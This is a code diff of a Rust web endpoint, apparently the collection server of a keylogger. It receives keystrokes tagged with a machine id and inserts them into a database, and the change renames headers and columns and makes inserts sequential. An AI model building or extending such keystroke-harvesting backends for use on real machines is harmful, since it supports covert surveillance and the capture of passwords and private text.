@@ -4,7 +4,7 @@ use chrono::NaiveDateTime;
 use utoipa::ToSchema;
 use uuid::Uuid;
 
-use crate::{AppState, Error};
+use crate::{AppState, Error, insure_device_exists};
 
 #[derive(serde::Deserialize, ToSchema)]
 #[schema(as = Post::KeyLogger::Req)]
@@ -27,7 +27,7 @@ pub struct Key {
         (status = 200, description = "inserted keylogger in db"),
     ),
     params(
-      ("device-id" = String, Header, description = "Device id"),
+      ("machine-id" = String, Header, description = "device hardware id"),
     ),
     tag = "Keylogger",
 )]
@@ -37,36 +37,29 @@ pub async fn post_keylogger(
     State(app_state): State<AppState>,
     Json(req): Json<Req>,
 ) -> Result<(), Error> {
-    let device_id = headers
-        .get("device-id")
+    let machine_id = headers
+        .get("machine-id")
         .and_then(|v| v.to_str().ok())
-        .unwrap_or("unknown");
+        .ok_or(Error::BadRequest("No machine-id in header".into()))?;
+    insure_device_exists(machine_id, &app_state.db_pool).await?;
 
-    let (_, results) = TokioScope::scope_and_block(|spawner| {
-        for key in req.keys.iter() {
-            let db_pool = app_state.db_pool.clone();
-            spawner.spawn(async move {
-                let keylog_id = Uuid::new_v4();
-                sqlx::query!(
-                    r#"
-                    INSERT INTO Keylog
-                        (keylog_id, device_id, key, created_at)
+    for key in req.keys.iter() {
+        let db_pool = app_state.db_pool.clone();
+        let id = Uuid::new_v4();
+        sqlx::query!(
+            r#"
+                    INSERT INTO Keylogs
+                        (id, device_machine_id, key, created_at)
                         VALUES ($1, $2, $3, $4)
                     ;
                 "#,
-                    keylog_id,
-                    device_id,
-                    &key.key_pressed,
-                    &key.at,
-                )
-                .execute(&db_pool)
-                .await
-            });
-        }
-    });
-
-    for result in results {
-        result??;
+            id,
+            machine_id,
+            &key.key_pressed,
+            &key.at,
+        )
+        .execute(&db_pool)
+        .await?;
     }
 
     Ok(())
